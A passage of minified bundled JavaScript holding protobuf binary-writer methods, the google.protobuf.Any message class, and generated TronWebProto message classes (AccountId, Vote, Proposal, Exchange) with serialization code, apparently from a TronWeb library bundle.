                    Cr(S(m[be]), G(m[be]), function(ze, at) {
                        oe.l(ze >>> 0, at >>> 0)
                    });
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedSplitZigzagVarint64 = te.prototype.od,
        te.prototype.dd = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++) {
                    var G = Le(m[S]);
                    this.a.l(G.lo, G.hi)
                }
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedInt64String = te.prototype.dd,
        te.prototype.pd = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.j(m[S]);
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedUint32 = te.prototype.pd,
        te.prototype.qd = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.j(parseInt(m[S], 10));
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedUint32String = te.prototype.qd,
        te.prototype.rd = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.va(m[S]);
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedUint64 = te.prototype.rd,
        te.prototype.sd = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++) {
                    var G = mn(m[S]);
                    this.a.l(G.lo, G.hi)
                }
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedUint64String = te.prototype.sd,
        te.prototype.hd = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.wa(m[S]);
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedSint32 = te.prototype.hd,
        te.prototype.jd = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.xa(m[S]);
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedSint64 = te.prototype.jd,
        te.prototype.kd = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.W(vt(m[S]));
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedSint64String = te.prototype.kd,
        te.prototype.ld = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.W(m[S]);
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedSintHash64 = te.prototype.ld,
        te.prototype.Wc = function(y, m) {
            if (m != null && m.length)
                for (it(this, y, 2),
                this.a.j(4 * m.length),
                y = 0; y < m.length; y++)
                    this.a.s(m[y])
        }
        ,
        te.prototype.writePackedFixed32 = te.prototype.Wc,
        te.prototype.Xc = function(y, m) {
            if (m != null && m.length)
                for (it(this, y, 2),
                this.a.j(8 * m.length),
                y = 0; y < m.length; y++)
                    this.a.V(m[y])
        }
        ,
        te.prototype.writePackedFixed64 = te.prototype.Xc,
        te.prototype.Yc = function(y, m) {
            if (m != null && m.length)
                for (it(this, y, 2),
                this.a.j(8 * m.length),
                y = 0; y < m.length; y++) {
                    var S = mn(m[y]);
                    this.a.A(S.lo, S.hi)
                }
        }
        ,
        te.prototype.writePackedFixed64String = te.prototype.Yc,
        te.prototype.ed = function(y, m) {
            if (m != null && m.length)
                for (it(this, y, 2),
                this.a.j(4 * m.length),
                y = 0; y < m.length; y++)
                    this.a.S(m[y])
        }
        ,
        te.prototype.writePackedSfixed32 = te.prototype.ed,
        te.prototype.fd = function(y, m) {
            if (m != null && m.length)
                for (it(this, y, 2),
                this.a.j(8 * m.length),
                y = 0; y < m.length; y++)
                    this.a.T(m[y])
        }
        ,
        te.prototype.writePackedSfixed64 = te.prototype.fd,
        te.prototype.gd = function(y, m) {
            if (m != null && m.length)
                for (it(this, y, 2),
                this.a.j(8 * m.length),
                y = 0; y < m.length; y++)
                    this.a.ka(m[y])
        }
        ,
        te.prototype.writePackedSfixed64String = te.prototype.gd,
        te.prototype.$c = function(y, m) {
            if (m != null && m.length)
                for (it(this, y, 2),
                this.a.j(4 * m.length),
                y = 0; y < m.length; y++)
                    this.a.L(m[y])
        }
        ,
        te.prototype.writePackedFloat = te.prototype.$c,
        te.prototype.Uc = function(y, m) {
            if (m != null && m.length)
                for (it(this, y, 2),
                this.a.j(8 * m.length),
                y = 0; y < m.length; y++)
                    this.a.J(m[y])
        }
        ,
        te.prototype.writePackedDouble = te.prototype.Uc,
        te.prototype.Tc = function(y, m) {
            if (m != null && m.length)
                for (it(this, y, 2),
                this.a.j(m.length),
                y = 0; y < m.length; y++)
                    this.a.I(m[y])
        }
        ,
        te.prototype.writePackedBool = te.prototype.Tc,
        te.prototype.Vc = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.R(m[S]);
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedEnum = te.prototype.Vc,
        te.prototype.Zc = function(y, m) {
            if (m != null && m.length)
                for (it(this, y, 2),
                this.a.j(8 * m.length),
                y = 0; y < m.length; y++)
                    this.a.K(m[y])
        }
        ,
        te.prototype.writePackedFixedHash64 = te.prototype.Zc,
        te.prototype.td = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.N(m[S]);
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedVarintHash64 = te.prototype.td,
        r.debug = Ht,
        r.Map = Y,
        r.Message = Ke,
        r.BinaryReader = re,
        r.BinaryWriter = te,
        r.ExtensionFieldInfo = zt,
        r.ExtensionFieldBinaryInfo = zi,
        r.exportSymbol = x,
        r.inherits = E,
        r.object = {
            extend: P
        },
        r.typeOf = v
    }(_l)),
    _l
}
var fW;
function EU() {
    return fW || (fW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")();
        t.exportSymbol("proto.google.protobuf.Any", null, o),
        proto.google.protobuf.Any = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(proto.google.protobuf.Any, e.Message),
        t.DEBUG && !COMPILED && (proto.google.protobuf.Any.displayName = "proto.google.protobuf.Any"),
        e.Message.GENERATE_TO_OBJECT && (proto.google.protobuf.Any.prototype.toObject = function(i) {
            return proto.google.protobuf.Any.toObject(i, this)
        }
        ,
        proto.google.protobuf.Any.toObject = function(i, n) {
            var s = {
                typeUrl: e.Message.getFieldWithDefault(n, 1, ""),
                value: n.getValue_asB64()
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        proto.google.protobuf.Any.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new proto.google.protobuf.Any;
            return proto.google.protobuf.Any.deserializeBinaryFromReader(s, n)
        }
        ,
        proto.google.protobuf.Any.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readString();
                    i.setTypeUrl(a);
                    break;
                case 2:
                    var a = n.readBytes();
                    i.setValue(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        proto.google.protobuf.Any.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return proto.google.protobuf.Any.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        proto.google.protobuf.Any.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getTypeUrl(),
            s.length > 0 && n.writeString(1, s),
            s = i.getValue_asU8(),
            s.length > 0 && n.writeBytes(2, s)
        }
        ,
        proto.google.protobuf.Any.prototype.getTypeUrl = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        proto.google.protobuf.Any.prototype.setTypeUrl = function(i) {
            return e.Message.setProto3StringField(this, 1, i)
        }
        ,
        proto.google.protobuf.Any.prototype.getValue = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        proto.google.protobuf.Any.prototype.getValue_asB64 = function() {
            return e.Message.bytesAsB64(this.getValue())
        }
        ,
        proto.google.protobuf.Any.prototype.getValue_asU8 = function() {
            return e.Message.bytesAsU8(this.getValue())
        }
        ,
        proto.google.protobuf.Any.prototype.setValue = function(i) {
            return e.Message.setProto3BytesField(this, 2, i)
        }
        ,
        t.object.extend(r, proto.google.protobuf),
        proto.google.protobuf.Any.prototype.getTypeName = function() {
            return this.getTypeUrl().split("/").pop()
        }
        ,
        proto.google.protobuf.Any.prototype.pack = function(i, n, s) {
            s || (s = "type.googleapis.com/"),
            s.substr(-1) != "/" ? this.setTypeUrl(s + "/" + n) : this.setTypeUrl(s + n),
            this.setValue(i)
        }
        ,
        proto.google.protobuf.Any.prototype.unpack = function(i, n) {
            return this.getTypeName() == n ? i(this.getValue_asU8()) : null
        }
    }(qT)),
    qT
}
var Age = EU();
const Pge = Zc(Age);
var VT = {}, dW;
function A4() {
    return dW || (dW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")()
          , i = EU();
        t.object.extend(proto, i),
        t.exportSymbol("TronWebProto.Account", null, o),
        t.exportSymbol("TronWebProto.Account.AccountResource", null, o),
        t.exportSymbol("TronWebProto.Account.Frozen", null, o),
        t.exportSymbol("TronWebProto.AccountId", null, o),
        t.exportSymbol("TronWebProto.AccountType", null, o),
        t.exportSymbol("TronWebProto.DelegatedResource", null, o),
        t.exportSymbol("TronWebProto.Exchange", null, o),
        t.exportSymbol("TronWebProto.Key", null, o),
        t.exportSymbol("TronWebProto.MarketOrderDetail", null, o),
        t.exportSymbol("TronWebProto.Permission", null, o),
        t.exportSymbol("TronWebProto.Permission.PermissionType", null, o),
        t.exportSymbol("TronWebProto.Proposal", null, o),
        t.exportSymbol("TronWebProto.Proposal.State", null, o),
        t.exportSymbol("TronWebProto.Transaction", null, o),
        t.exportSymbol("TronWebProto.Transaction.Contract", null, o),
        t.exportSymbol("TronWebProto.Transaction.Contract.ContractType", null, o),
        t.exportSymbol("TronWebProto.Transaction.Result", null, o),
        t.exportSymbol("TronWebProto.Transaction.Result.code", null, o),
        t.exportSymbol("TronWebProto.Transaction.Result.contractResult", null, o),
        t.exportSymbol("TronWebProto.Transaction.raw", null, o),
        t.exportSymbol("TronWebProto.Vote", null, o),
        t.exportSymbol("TronWebProto.Votes", null, o),
        t.exportSymbol("TronWebProto.Witness", null, o),
        t.exportSymbol("TronWebProto.authority", null, o),
        TronWebProto.AccountId = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.AccountId, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.AccountId.displayName = "TronWebProto.AccountId"),
        TronWebProto.Vote = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.Vote, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Vote.displayName = "TronWebProto.Vote"),
        TronWebProto.Proposal = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.Proposal.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.Proposal, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Proposal.displayName = "TronWebProto.Proposal"),
        TronWebProto.Exchange = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.Exchange, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Exchange.displayName = "TronWebProto.Exchange"),
        TronWebProto.Account = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.Account.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.Account, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Account.displayName = "TronWebProto.Account"),
        TronWebProto.Account.Frozen = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.Account.Frozen, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Account.Frozen.displayName = "TronWebProto.Account.Frozen"),
        TronWebProto.Account.AccountResource = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.Account.AccountResource, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Account.AccountResource.displayName = "TronWebProto.Account.AccountResource"),
        TronWebProto.Key = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.Key, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Key.displayName = "TronWebProto.Key"),
        TronWebProto.DelegatedResource = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.DelegatedResource, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.DelegatedResource.displayName = "TronWebProto.DelegatedResource"),
        TronWebProto.authority = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.authority, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.authority.displayName = "TronWebProto.authority"),
        TronWebProto.Permission = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.Permission.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.Permission, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Permission.displayName = "TronWebProto.Permission"),
        TronWebProto.Witness = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.Witness, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Witness.displayName = "TronWebProto.Witness"),
        TronWebProto.Votes = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.Votes.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.Votes, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Votes.displayName = "TronWebProto.Votes"),
        TronWebProto.MarketOrderDetail = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.MarketOrderDetail, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.MarketOrderDetail.displayName = "TronWebProto.MarketOrderDetail"),
        TronWebProto.Transaction = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.Transaction.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.Transaction, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Transaction.displayName = "TronWebProto.Transaction"),
        TronWebProto.Transaction.Contract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.Transaction.Contract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Transaction.Contract.displayName = "TronWebProto.Transaction.Contract"),
        TronWebProto.Transaction.Result = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.Transaction.Result.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.Transaction.Result, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Transaction.Result.displayName = "TronWebProto.Transaction.Result"),
        TronWebProto.Transaction.raw = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.Transaction.raw.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.Transaction.raw, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.Transaction.raw.displayName = "TronWebProto.Transaction.raw"),
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountId.prototype.toObject = function(n) {
            return TronWebProto.AccountId.toObject(n, this)
        }
        ,
        TronWebProto.AccountId.toObject = function(n, s) {
            var a = {
                name: s.getName_asB64(),
                address: s.getAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.AccountId.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.AccountId;
            return TronWebProto.AccountId.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.AccountId.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setName(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.AccountId.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.AccountId.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.AccountId.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getName_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a)
        }
        ,
        TronWebProto.AccountId.prototype.getName = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.AccountId.prototype.getName_asB64 = function() {
            return e.Message.bytesAsB64(this.getName())
        }
        ,
        TronWebProto.AccountId.prototype.getName_asU8 = function() {
            return e.Message.bytesAsU8(this.getName())
        }
        ,
        TronWebProto.AccountId.prototype.setName = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.AccountId.prototype.getAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.AccountId.prototype.getAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getAddress())
        }
        ,
        TronWebProto.AccountId.prototype.getAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getAddress())
        }
        ,
        TronWebProto.AccountId.prototype.setAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Vote.prototype.toObject = function(n) {
            return TronWebProto.Vote.toObject(n, this)
        }
        ,
        TronWebProto.Vote.toObject = function(n, s) {
            var a = {
                voteAddress: s.getVoteAddress_asB64(),
                voteCount: e.Message.getFieldWithDefault(s, 2, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.Vote.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Vote;
            return TronWebProto.Vote.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Vote.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setVoteAddress(l);
                    break;
                case 2:
                    var l = s.readInt64();
                    n.setVoteCount(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Vote.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Vote.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Vote.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getVoteAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getVoteCount(),
            a !== 0 && s.writeInt64(2, a)
        }
        ,
        TronWebProto.Vote.prototype.getVoteAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.Vote.prototype.getVoteAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getVoteAddress())
        }
        ,
        TronWebProto.Vote.prototype.getVoteAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getVoteAddress())
        }
        ,
        TronWebProto.Vote.prototype.setVoteAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.Vote.prototype.getVoteCount = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.Vote.prototype.setVoteCount = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        TronWebProto.Proposal.repeatedFields_ = [6],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Proposal.prototype.toObject = function(n) {
            return TronWebProto.Proposal.toObject(n, this)
        }
        ,
        TronWebProto.Proposal.toObject = function(n, s) {
            var a, l = {
                proposalId: e.Message.getFieldWithDefault(s, 1, 0),
                proposerAddress: s.getProposerAddress_asB64(),
                parametersMap: (a = s.getParametersMap()) ? a.toObject(n, void 0) : [],
                expirationTime: e.Message.getFieldWithDefault(s, 4, 0),
                createTime: e.Message.getFieldWithDefault(s, 5, 0),
                approvalsList: s.getApprovalsList_asB64(),
                state: e.Message.getFieldWithDefault(s, 7, 0)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.Proposal.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Proposal;
            return TronWebProto.Proposal.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Proposal.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readInt64();
                    n.setProposalId(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setProposerAddress(l);
                    break;
                case 3:
                    var l = n.getParametersMap();
                    s.readMessage(l, function(f, h) {
                        e.Map.deserializeBinary(f, h, e.BinaryReader.prototype.readInt64, e.BinaryReader.prototype.readInt64, null, 0, 0)
                    });
                    break;
                case 4:
                    var l = s.readInt64();
                    n.setExpirationTime(l);
                    break;
                case 5:
                    var l = s.readInt64();
                    n.setCreateTime(l);
                    break;
                case 6:
                    var l = s.readBytes();
                    n.addApprovals(l);
                    break;
                case 7:
                    var l = s.readEnum();
                    n.setState(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Proposal.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Proposal.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Proposal.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getProposalId(),
            a !== 0 && s.writeInt64(1, a),
            a = n.getProposerAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getParametersMap(!0),
            a && a.getLength() > 0 && a.serializeBinary(3, s, e.BinaryWriter.prototype.writeInt64, e.BinaryWriter.prototype.writeInt64),
            a = n.getExpirationTime(),
            a !== 0 && s.writeInt64(4, a),
            a = n.getCreateTime(),
            a !== 0 && s.writeInt64(5, a),
            a = n.getApprovalsList_asU8(),
            a.length > 0 && s.writeRepeatedBytes(6, a),
            a = n.getState(),
            a !== 0 && s.writeEnum(7, a)
        }
        ,
        TronWebProto.Proposal.State = {
            PENDING: 0,
            DISAPPROVED: 1,
            APPROVED: 2,
            CANCELED: 3
        },
        TronWebProto.Proposal.prototype.getProposalId = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.Proposal.prototype.setProposalId = function(n) {
            return e.Message.setProto3IntField(this, 1, n)
        }
        ,
        TronWebProto.Proposal.prototype.getProposerAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.Proposal.prototype.getProposerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getProposerAddress())
        }
        ,
        TronWebProto.Proposal.prototype.getProposerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getProposerAddress())
        }
        ,
        TronWebProto.Proposal.prototype.setProposerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.Proposal.prototype.getParametersMap = function(n) {
            return e.Message.getMapField(this, 3, n, null)
        }
        ,
        TronWebProto.Proposal.prototype.clearParametersMap = function() {
            return this.getParametersMap().clear(),
            this
        }
        ,
        TronWebProto.Proposal.prototype.getExpirationTime = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.Proposal.prototype.setExpirationTime = function(n) {
            return e.Message.setProto3IntField(this, 4, n)
        }
        ,
        TronWebProto.Proposal.prototype.getCreateTime = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.Proposal.prototype.setCreateTime = function(n) {
            return e.Message.setProto3IntField(this, 5, n)
        }
        ,
        TronWebProto.Proposal.prototype.getApprovalsList = function() {
            return e.Message.getRepeatedField(this, 6)
        }
        ,
        TronWebProto.Proposal.prototype.getApprovalsList_asB64 = function() {
            return e.Message.bytesListAsB64(this.getApprovalsList())
        }
        ,
        TronWebProto.Proposal.prototype.getApprovalsList_asU8 = function() {
            return e.Message.bytesListAsU8(this.getApprovalsList())
        }
        ,
        TronWebProto.Proposal.prototype.setApprovalsList = function(n) {
            return e.Message.setField(this, 6, n || [])
        }
        ,
        TronWebProto.Proposal.prototype.addApprovals = function(n, s) {
            return e.Message.addToRepeatedField(this, 6, n, s)
        }
        ,
        TronWebProto.Proposal.prototype.clearApprovalsList = function() {
            return this.setApprovalsList([])
        }
        ,
        TronWebProto.Proposal.prototype.getState = function() {
            return e.Message.getFieldWithDefault(this, 7, 0)
        }
        ,
        TronWebProto.Proposal.prototype.setState = function(n) {
            return e.Message.setProto3EnumField(this, 7, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Exchange.prototype.toObject = function(n) {
            return TronWebProto.Exchange.toObject(n, this)
        }
        ,
        TronWebProto.Exchange.toObject = function(n, s) {
            var a = {
                exchangeId: e.Message.getFieldWithDefault(s, 1, 0),
                creatorAddress: s.getCreatorAddress_asB64(),
                createTime: e.Message.getFieldWithDefault(s, 3, 0),
                firstTokenId: s.getFirstTokenId_asB64(),
                firstTokenBalance: e.Message.getFieldWithDefault(s, 7, 0),
                secondTokenId: s.getSecondTokenId_asB64(),
                secondTokenBalance: e.Message.getFieldWithDefault(s, 9, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.Exchange.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Exchange;
            return TronWebProto.Exchange.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Exchange.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readInt64();
                    n.setExchangeId(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setCreatorAddress(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setCreateTime(l);
                    break;
                case 6:
                    var l = s.readBytes();
                    n.setFirstTokenId(l);
                    break;
                case 7:
                    var l = s.readInt64();
                    n.setFirstTokenBalance(l);
                    break;
                case 8:
                    var l = s.readBytes();
                    n.setSecondTokenId(l);
                    break;
                case 9:
                    var l = s.readInt64();
                    n.setSecondTokenBalance(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Exchange.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Exchange.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Exchange.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getExchangeId(),
            a !== 0 && s.writeInt64(1, a),
            a = n.getCreatorAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getCreateTime(),
            a !== 0 && s.writeInt64(3, a),
            a = n.getFirstTokenId_asU8(),
            a.length > 0 && s.writeBytes(6, a),
            a = n.getFirstTokenBalance(),
            a !== 0 && s.writeInt64(7, a),
            a = n.getSecondTokenId_asU8(),
            a.length > 0 && s.writeBytes(8, a),
            a = n.getSecondTokenBalance(),
            a !== 0 && s.writeInt64(9, a)
        }
        ,
        TronWebProto.Exchange.prototype.getExchangeId = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.Exchange.prototype.setExchangeId = function(n) {
            return e.Message.setProto3IntField(this, 1, n)
        }
        ,
        TronWebProto.Exchange.prototype.getCreatorAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.Exchange.prototype.getCreatorAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getCreatorAddress())
        }
        ,
        TronWebProto.Exchange.prototype.getCreatorAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getCreatorAddress())
        }
        ,
        TronWebProto.Exchange.prototype.setCreatorAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.Exchange.prototype.getCreateTime = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.Exchange.prototype.setCreateTime = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.Exchange.prototype.getFirstTokenId = function() {
            return e.Message.getFieldWithDefault(this, 6, "")
        }
        ,
        TronWebProto.Exchange.prototype.getFirstTokenId_asB64 = function() {
            return e.Message.bytesAsB64(this.getFirstTokenId())
        }
        ,
        TronWebProto.Exchange.prototype.getFirstTokenId_asU8 = function() {
            return e.Message.bytesAsU8(this.getFirstTokenId())
        }
        ,
        TronWebProto.Exchange.prototype.setFirstTokenId = function(n) {
            return e.Message.setProto3BytesField(this, 6, n)
        }
        ,
        TronWebProto.Exchange.prototype.getFirstTokenBalance = function() {
            return e.Message.getFieldWithDefault(this, 7, 0)
        }
        ,
        TronWebProto.Exchange.prototype.setFirstTokenBalance = function(n) {
            return e.Message.setProto3IntField(this, 7, n)
        }
        ,
        TronWebProto.Exchange.prototype.getSecondTokenId = function() {
            return e.Message.getFieldWithDefault(this, 8, "")
        }
        ,
        TronWebProto.Exchange.prototype.getSecondTokenId_asB64 = function() {
            return e.Message.bytesAsB64(this.getSecondTokenId())
        }
        ,
